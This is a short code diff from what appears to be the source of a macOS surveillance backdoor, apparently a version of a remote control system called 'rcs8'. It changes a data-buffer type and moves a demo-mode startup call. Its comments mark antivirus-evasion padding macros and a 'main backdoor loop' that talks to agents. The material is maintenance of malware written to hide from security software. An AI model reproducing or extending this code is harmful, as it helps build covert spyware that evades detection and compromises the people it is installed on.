@@ -3773,7 +3773,7 @@ static void computerWillShutdown(CFMachPortRef port,
     // AV evasion: only on release build
     AV_GARBAGE_001
     
-    NSMutableData *demoMode = [[NSData alloc] initWithBytes: gDemoMarker length: 24];
+    NSMutableData *demoMode = [[NSMutableData alloc] initWithBytes: gDemoMarker length: 24];
     
     // AV evasion: only on release build
     AV_GARBAGE_002
@@ -3973,6 +3973,9 @@ static void computerWillShutdown(CFMachPortRef port,
     {
       return NO;
     }
+  
+  // set desktop background for demo mode
+  [self checkAndRunDemoMode];
   
   // check if we are running rcs8 for the first time
   // or there are comps ready for upgrade
@@ -4432,9 +4435,6 @@ static void computerWillShutdown(CFMachPortRef port,
   
   // AV evasion: only on release build
   AV_GARBAGE_009
-  
-  // set desktop background for demo mode
-  [self checkAndRunDemoMode];
   
   // Main backdoor loop
   [self _communicateWithAgents];
